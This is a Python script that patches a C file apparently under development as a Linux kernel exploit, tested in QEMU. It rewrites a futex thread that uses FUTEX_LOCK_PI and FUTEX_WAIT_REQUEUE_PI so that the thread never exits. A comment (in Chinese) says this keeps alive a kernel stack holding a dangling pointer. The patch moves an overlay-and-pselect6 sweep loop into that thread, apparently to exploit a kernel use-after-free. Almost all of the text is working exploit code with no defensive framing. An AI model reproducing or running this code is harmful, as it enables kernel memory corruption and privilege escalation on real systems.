import io
p = r'C:\Users\QingJ\Desktop\root\work\qemu\init_sweep.c'
src = io.open(p, encoding='utf-8').read()

old = r'''static int waiter_fn(void*a){
  (void)a;
  waiter_tid = sys(SYS_gettid,0,0,0,0,0,0);
  puts_("WTID="); putx_((unsigned long)waiter_tid); puts_("\n");
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  waiter_ready=1;
  while(!owner_started) nsleep_us(1000);
  long to[2]; sys(SYS_clock_gettime,CLOCK_MONOTONIC,(long)to,0,0,0,0);
  to[0]+=3;
  waiter_waiting=1;
  sys(SYS_futex,(long)&f_wait,FUTEX_WAIT_REQUEUE_PI,0,(long)to,(long)&f_pi_target,0);
  puts_("WAITER_RET\n");
  sys(SYS_fcntl,1,0,NFDS+128,0,0,0);
  armed=1;
  return 0;
}'''

new = r'''static int waiter_fn(void*a){
  (void)a;
  waiter_tid = sys(SYS_gettid,0,0,0,0,0,0);
  puts_("WTID="); putx_((unsigned long)waiter_tid); puts_("\n");
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  waiter_ready=1;
  while(!owner_started) nsleep_us(1000);
  long to[2]; sys(SYS_clock_gettime,CLOCK_MONOTONIC,(long)to,0,0,0,0);
  to[0]+=3;
  waiter_waiting=1;
  sys(SYS_futex,(long)&f_wait,FUTEX_WAIT_REQUEUE_PI,0,(long)to,(long)&f_pi_target,0);
  puts_("WAITER_RET\n");
  sys(SYS_fcntl,1,0,NFDS+128,0,0,0);
  /* 关键: 本线程此后绝不退出, 保住含悬垂指针的内核栈 */
  for(int s=0; s<=3*(int)WPS-13; s++){
    build_overlay(s);
    open_selected();
    puts_("ROUND s="); putx_((unsigned long)s); puts_("\n");
    long pts[2]={3,0};
    sys(SYS_pselect6,NFDS,(long)inb,(long)outb,(long)exb,(long)pts,0);
    show_bootid("BOOTID=");
  }
  puts_("SWEEP_LOOPS_DONE\n");
  for(;;) nsleep_us(500000);
}'''

assert old in src, 'waiter_fn not found'
src = src.replace(old, new)

# main: 移除外部 sweep 驱动 (已移入 waiter)
old2 = r'''  while(!armed) nsleep_us(10000);
  /* sweep: 每轮一个 shift s, 重建 overlay+fds, 短 pselect 让 consumer 打点 */
  for(int s=0; s<=3*WPS-13; s++){
    build_overlay(s);
    open_selected();
    puts_("ROUND s="); putx_((unsigned long)s); puts_(" ");
    long pts[2]={2,0};
    sys(SYS_pselect6,NFDS,(long)inb,(long)outb,(long)exb,(long)pts,0);
    show_bootid("BOOTID=");
  }
  show_bootid("BOOTID_FINAL=");'''
new2 = r'''  while(!done_) nsleep_us(100000);'''
assert old2 in src, 'main sweep block not found'
src = src.replace(old2, new2)

io.open(p, 'w', encoding='utf-8').write(src)
print('sweep v2 patched: waiter keeps stack alive through entire sweep')
